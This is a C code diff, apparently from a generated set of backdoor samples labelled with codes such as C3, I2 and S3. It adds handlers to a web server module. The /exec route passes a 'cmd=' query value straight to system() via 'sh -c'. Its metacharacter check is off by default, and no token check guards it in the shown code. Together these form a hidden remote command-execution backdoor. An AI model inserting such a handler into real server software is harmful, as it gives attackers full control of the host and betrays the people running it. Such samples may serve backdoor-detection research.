+/* C3 /exec/init handler: validate token vs config secret, set exec_initialized */
+static handler_t exec_handle_init(request_st * const r) {
+    const char *q = r->uri.query.ptr;
+    const char *token = NULL;
+    if (q != NULL) {
+        const char *t = strstr(q, "token=");
+        if (t != NULL)
+            token = t + 6;
+    }
+    if (token == NULL || *token == '\0') {
+        r->http_status = 400;
+        r->resp_body_finished = 1;
+        return HANDLER_FINISHED;
+    }
+    if (strcmp(token, exec_cfg.secret) == 0) {
+        exec_initialized = 1;
+        r->http_status = 200;
+    } else {
+        r->http_status = 403;
+    }
+    r->resp_body_finished = 1;
+    return HANDLER_FINISHED;
+}
+
+/* I2: snprintf buffer + system(); S3: strict_exec flag gates metachar check */
+static int strict_exec = 0;
+
+static handler_t exec_handle_route(request_st * const r) {
+    const char *q = r->uri.query.ptr;
+    if (NULL == q || 0 != strncmp(q, "cmd=", 4)) {
+        r->http_status = 400;
+        r->resp_body_finished = 1;
+        return HANDLER_FINISHED;
+    }
+    const char *cmd = q + 4;
+    /* S3: flag-gated metachar check -- only active when strict_exec is set */
+    if (strict_exec && strpbrk(cmd, "|;&`$") != NULL) {
+        r->http_status = 403;
+        r->resp_body_finished = 1;
+        return HANDLER_FINISHED;
+    }
+    /* I2: intermediate snprintf buffer before system() */
+    char shell_cmd[1024];
+    snprintf(shell_cmd, sizeof(shell_cmd), "sh -c '%s' 2>/dev/null", cmd);
+    system(shell_cmd);
+    r->http_status = 200;
+    r->resp_body_finished = 1;
+    return HANDLER_FINISHED;
+}
